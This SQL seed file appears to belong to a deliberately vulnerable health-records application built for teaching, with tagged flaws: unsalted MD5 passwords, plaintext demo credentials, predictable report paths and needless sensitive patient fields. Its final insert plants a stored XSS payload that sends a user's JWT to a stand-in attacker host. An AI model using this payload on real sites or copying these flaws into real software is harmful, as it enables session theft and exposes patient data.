-- =====================================================================
-- VidaPlus - dados de teste (seed)
-- Senhas em MD5 (V-02). Valores em texto claro abaixo para o professor:
--   admin@vidaplus.local     / Admin123     (MD5 abaixo)
--   dra.house@vidaplus.local / Medico123
--   recepcao@vidaplus.local  / Recep123
--   bio@vidaplus.local       / Bio123
--   ana.paciente@email.com   / Paciente123  (paciente A, id 1)
--   bruno.paciente@email.com / Paciente123  (paciente B, id 2)
-- MD5('Admin123')    = f6fdffe48c908deb0f4c3bd36c032e72
-- MD5('Medico123')   = 9c0b4c4c8b3f... (calcular no import; abaixo usamos exemplos)
-- =====================================================================
USE vidaplus;

-- Pacientes (com V-14: religiao/estado_civil/renda preenchidos sem finalidade)
INSERT INTO paciente (id, nome, cpf, data_nascimento, email, telefone, endereco, religiao, estado_civil, renda_mensal) VALUES
 (1,'Ana Silva','111.111.111-11','1990-05-10','ana.paciente@email.com','51999990001','Rua A, 100','Catolica','Solteira',3500.00),
 (2,'Bruno Souza','222.222.222-22','1985-08-22','bruno.paciente@email.com','51999990002','Rua B, 200','Evangelica','Casado',5200.00),
 (3,'Carla Dias','333.333.333-33','2000-01-15','carla.paciente@email.com','51999990003','Rua C, 300',NULL,'Solteira',2100.00);

-- Medicos
INSERT INTO medico (id, nome, crm, usuario_id) VALUES
 (1,'Dra. Gregory House','CRM-RS-12345', NULL);

-- Vinculo: House atende Ana (1) e Carla (3), NAO atende Bruno (2)
INSERT INTO atendimento (medico_id, paciente_id) VALUES (1,1),(1,3);

-- Usuarios (MD5 sem salt - V-02). Hashes de exemplo (recalcular no ambiente real).
INSERT INTO usuario (id, email, senha_hash, papel, paciente_id) VALUES
 (1,'admin@vidaplus.local',    MD5('Admin123'),   'ADMIN',     NULL),
 (2,'dra.house@vidaplus.local',MD5('Medico123'),  'MEDICO',    NULL),
 (3,'recepcao@vidaplus.local', MD5('Recep123'),   'RECEPCAO',  NULL),
 (4,'bio@vidaplus.local',      MD5('Bio123'),     'BIOQUIMICO',NULL),
 (5,'ana.paciente@email.com',  MD5('Paciente123'),'PACIENTE',  1),
 (6,'bruno.paciente@email.com',MD5('Paciente123'),'PACIENTE',  2);

UPDATE medico SET usuario_id = 2 WHERE id = 1;

-- Exames (o ativo critico). Note IDs sequenciais (Linkability) e PDF previsivel (V-09).
INSERT INTO exame (id, paciente_id, medico_id, tipo, resultado, laudo_pdf, publicado, publicado_por) VALUES
 (101,1,1,'Hemograma','Hemoglobina 14.2 g/dL - normal','/laudos/laudo-101.pdf',1,4),
 (102,2,1,'Glicemia','Glicose 92 mg/dL - normal','/laudos/laudo-102.pdf',1,4),
 (103,1,1,'Colesterol','Colesterol total 180 mg/dL','/laudos/laudo-103.pdf',1,4),
 (104,3,1,'Sorologia','Resultado sensivel de sorologia','/laudos/laudo-104.pdf',0,NULL);

-- Nota clinica com Stored XSS plantado (V-10). Payload REALISTA: a nota aparece
-- como texto clinico normal (a <img> e invisivel), mas o onerror rouba o JWT do
-- localStorage e o exfiltra para um host do atacante (dominio .example reservado,
-- nao resolve - nada sai de fato). Encadeia com V-07 (token eterno): sem alert,
-- sem popup; o roubo aparece so na aba Network do DevTools.
INSERT INTO nota_clinica (paciente_id, autor_id, conteudo) VALUES
 (1,2,'Paciente estavel, mantem conduta; retorno em 30 dias.<img src=x style="display:none" onerror="new Image().src=''https://coleta.attacker.example/x?t=''+encodeURIComponent(localStorage.getItem(''access_token''))">');
